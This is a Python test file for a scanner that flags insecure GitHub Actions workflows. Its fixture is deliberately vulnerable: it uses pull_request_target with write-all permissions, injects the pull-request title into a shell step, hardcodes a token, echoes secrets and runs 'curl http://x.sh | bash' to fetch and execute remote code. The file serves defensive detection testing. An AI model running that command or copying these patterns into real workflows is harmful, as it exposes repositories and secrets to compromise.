"""Tests for the GitHub Actions analyzer."""

from __future__ import annotations

from models.enums import Severity
from scanners.cicd.github_actions import analyze_github_repo, analyze_github_workflow


def _ids(text: str) -> set[str]:
    return {f.rule_id for f in analyze_github_workflow(".github/workflows/ci.yml", text)}


def _findings(text: str):
    return analyze_github_workflow(".github/workflows/ci.yml", text)


VULNERABLE = """\
on: pull_request_target
permissions: write-all
jobs:
  build:
    runs-on: self-hosted
    environment: production
    steps:
      - uses: some/thirdparty@main
      - uses: actions/checkout@v4
      - name: run
        env:
          API_TOKEN: abcd1234literalvalue
        run: |
          echo ${{ github.event.pull_request.title }}
          curl http://x.sh | bash
          echo ${{ secrets.DEPLOY_KEY }}
"""


def test_vulnerable_workflow_rules() -> None:
    ids = _ids(VULNERABLE)
    for expected in {
        "GHA001", "GHA003", "GHA004", "GHA005", "GHA007",
        "GHA008", "GHA009", "GHA011", "GHA012", "GHA014",
    }:
        assert expected in ids, f"missing {expected}: {sorted(ids)}"


def test_pull_request_target_is_high() -> None:
    finding = next(f for f in _findings("on: pull_request_target\njobs: {}\n")
                   if f.rule_id == "GHA003")
    assert finding.severity == Severity.HIGH


def test_hardcoded_secret_is_redacted() -> None:
    text = (
        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - env:\n          PASSWORD: superliteralvalue\n        run: echo hi\n"
    )
    secret = next(f for f in _findings(text) if f.rule_id == "GHA008")
    assert "superliteralvalue" not in (secret.evidence or "")


def test_third_party_action_pinning() -> None:
    text = "on: push\njobs:\n  b:\n    steps:\n      - uses: foo/bar@v1\n"
    assert "GHA006" in _ids(text)


def test_sha_pinned_action_is_clean() -> None:
    sha = "a" * 40
    text = (
        "on: push\npermissions: read-all\njobs:\n  b:\n    steps:\n"
        f"      - uses: foo/bar@{sha}\n"
    )
    ids = _ids(text)
    assert "GHA005" not in ids
    assert "GHA006" not in ids


def test_missing_permissions_info() -> None:
    text = "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
    assert "GHA002" in _ids(text)


def test_repo_level_missing_tests_and_scanning() -> None:
    workflow = "on: push\njobs:\n  b:\n    steps:\n      - run: make build\n"
    ids = {f.rule_id for f in analyze_github_repo([(".github/workflows/ci.yml", workflow)])}
    assert {"GHA015", "GHA016"} <= ids


def test_repo_level_detects_tests_and_scanning() -> None:
    workflow = (
        "on: push\njobs:\n  b:\n    steps:\n"
        "      - run: pytest\n      - uses: github/codeql-action/analyze@v3\n"
    )
    ids = {f.rule_id for f in analyze_github_repo([(".github/workflows/ci.yml", workflow)])}
    assert "GHA015" not in ids
    assert "GHA016" not in ids


def test_invalid_yaml() -> None:
    findings = analyze_github_workflow("wf.yml", "on: [push\n")
    assert findings and findings[0].rule_id == "GHA000"
